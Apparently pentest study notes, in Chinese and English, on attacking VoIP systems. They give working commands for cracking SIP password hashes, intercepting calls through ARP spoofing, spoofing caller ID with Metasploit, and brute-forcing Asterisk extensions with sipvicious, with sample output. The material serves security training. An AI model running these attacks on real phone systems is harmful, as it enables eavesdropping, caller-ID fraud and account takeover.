## http://www.concise-courses.com/learn/how-to-exploit-voip/

### 破解 SIP 密码

	用 wireshark 抓包生成 test.pcap
	sipdump pashash.txt -p test.pcap 从数据包中获取哈希密码
	sipcrack pashash.txt -w passlist.txt 通过字典文件 passlist.txt 破解哈希密码

### 使用 wireshark 监听数据包中的语音

	wireshark - statistics - hierarchy
	（wireshark - 统计 - 等级制度）
	发现多数流量都是 Real-Time Transport Protocol
	wireshark - Telephony - VoIP Calls
	（wireshark - 电话 - VoIP Calls）
	
### SIP Invite Spoof(fake call)

	http://www.youtube.com/watch?v=GkdyQVh36qc
	this module will create a fake SIP invite request making the targeted device ring and display fake caller id information
	The spoofed caller is send MSG(fake caller id)
	Use metasploit and sip phone(SFLphone)
	
	root@kali:~# msfconsole
	msf > search sip
	msf > use auxiliary/voip/sip_invite_spoof
	msf auxiliary(sip_invite_spoof) > show options
	msf auxiliary(sip_invite_spoof) > set DOMAIN 15261@sip.sflphone.org(软电话使用的域)
	msf auxiliary(sip_invite_spoof) > set SRCADDR 37.244.213.229(本机地址)
	msf auxiliary(sip_invite_spoof) > set RHOSTS 37.244.213.229/24
	msf auxiliary(sip_invite_spoof) > run
	
### Eavesdrop on VoIP Conversations
	http://www.youtube.com/watch?v=YGi4rSDofTs
	ettercap -T -M ARP -i <interface> // //
	使用 wireshark 抓包
	
	http://www.ehacking.net/2012/06/voip-sniffing-cracking-phishing.html

	http://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP

### sipvicious 工具集

	root@kali:~# svmap 172.16.8.181
	| SIP Device        | User Agent           | Fingerprint |
	----------------------------------------------------------
	| 172.16.8.181:5060 | Asterisk PBX 1.8.6.0 | disabled    |

	root@kali:~# svwar -e 18101-18105 172.16.8.181 -m INVITE
	| Extension | Authentication |
	------------------------------
	| 18101     | reqauth        |

	root@kali:~# svcrack -u 18101 172.16.8.181
	| Extension | Password |
	------------------------
	| 18101     | 18101    |

	root@kali:~# svcrack -u 18101 -r 18101-18105 172.16.8.181
	| Extension | Password |
	------------------------
	| 18101     | 18101    |

	root@kali:~# cat pass.txt 
	18101
	18102
	root@kali:~# svcrack -u 18101 -d pass.txt 172.16.8.181
	| Extension | Password |
	------------------------
	| 18101     | 18101    |